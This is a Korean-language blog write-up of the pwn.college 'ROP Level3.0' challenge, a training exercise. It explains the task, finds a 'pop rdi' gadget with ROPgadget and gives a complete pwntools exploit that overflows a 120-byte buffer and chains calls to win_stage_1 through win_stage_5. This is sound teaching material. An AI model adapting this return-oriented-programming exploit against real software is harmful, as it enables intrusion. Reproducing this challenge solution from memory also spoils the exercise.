---
title: "[pwn.college] ROP Level3.0 Write up"
author: d0razi
date: 2023-08-12 16:30
categories: [InfoSec, Pwn]
tags: [linux, pwn.college]
image: /assets/img/media/banner/pwn-college.png
---

# 문제 분석

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level3.0/Untitled.png)

간단하게 해석해보면

> 이번 문제에는 win_stage_1 부터 win_stage_5까지 함수가 있습니다. 플래그를 얻기 위해서는 각 함수를 호출 할 때 마다 스테이지 숫자를 인자로 넘겨주어야합니다.
> 

그러면 우리는 pop rdi 가젯을 구해야 합니다.

**익스플로잇 시나리오**

1. 버퍼 채우기(120)
2. [pop rdi] + [stage_number] + [function address] 이런 순서로 1부터 5까지 페이로드를 작성해주기

## Gadget 구하기

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level3.0/Untitled%201.png)

```bash
ROPgadget --binary /challenge/babyrop_level3.0 | grep "pop rdi"
```

# Exploit code

```python
from pwn import *

p = process("/challenge/babyrop_level3.0")
e = ELF("/challenge/babyrop_level3.0")

pop_rdi = 0x0000000000402da3

payload = b"a" * 120

for i in range(1,6):
    win_stage = f"win_stage_{i}"
    payload += p64(pop_rdi) + p64(i) + p64(e.symbols[win_stage])

p.sendline(payload)
p.recvuntil(b'Leaving!')
p.interactive()
```

![Untitled](/assets/img/media/post_img/pwn/pwn.college/rop/level3.0/Untitled%202.png)